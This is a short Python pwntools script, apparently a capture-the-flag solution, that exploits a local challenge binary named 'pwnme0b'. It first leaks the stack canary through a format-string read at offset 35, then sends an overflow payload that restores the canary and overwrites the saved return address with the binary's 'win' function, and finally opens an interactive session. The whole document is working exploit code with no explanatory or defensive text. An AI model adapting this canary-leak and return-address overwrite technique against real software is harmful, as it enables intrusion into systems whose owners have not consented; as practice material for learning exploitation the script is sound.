from pwn import *

context.arch = "i386"
elf = ELF("./pwnme0b")

# --- Run 1: leak canary ---
b = process("./pwnme0b")
b.recvuntil(b"WWW\n")
b.sendline(b"%35$08x")   # canary is at offset 35
b.sendline(b"AAAA")
output = b.recvall(timeout=2)
canary = int(output.strip().split(b"\n")[-1].strip(), 16)
log.info(f"Leaked canary: {hex(canary)}")
b.close()

# --- Run 2: use canary to get shell ---
b = process("./pwnme0b")
b.recvuntil(b"WWW\n")

win_addr = elf.symbols['win']

b.sendline(b"AAAA")    # input 1 (buf1) - dummy

payload  = b'A' * 0x74      # padding to canary
payload += p32(canary)      # restore canary
payload += p32(0)           # saved EBX
payload += p32(0)           # saved EBP
payload += p32(win_addr)    # overwrite EIP
b.sendline(payload)

b.interactive()